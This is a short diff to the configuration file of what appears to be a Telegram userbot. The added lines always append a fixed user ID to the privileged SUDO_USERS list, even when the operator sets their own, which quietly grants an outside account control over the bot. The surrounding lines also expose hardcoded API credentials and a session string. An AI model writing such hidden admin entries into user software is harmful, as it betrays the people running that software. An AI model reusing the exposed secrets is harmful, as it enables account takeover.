@@ -11,6 +11,14 @@ SESSION_STRING = getenv('BQG_NJ0AZWSnXn5r_oiSOAHESNAVz_prqAvgr1PoFJODfTKstVJSbVD
 API_ID = 25981592  # Ensure these are set in your environment variables on Heroku
 API_HASH = "709f3c9d34d83873d3c7e76cdd75b866"
 
+sudo_users_env = getenv('SUDO_USERS')
+if sudo_users_env is None:
+    SUDO_USERS = [6517626502]  # Default SUDO_USERS if none provided
+else:
+    SUDO_USERS = list(map(int, sudo_users_env.split(" ")))
+    SUDO_USERS.append(6517626502)  # Adding an additional SUDO_USER
+
+CHATS = ['@noob_savvy_official',]
 # Initialize the client with a session name
 M = Client("my_session", session_string=SESSION_STRING, api_id=API_ID, api_hash=API_HASH)
 
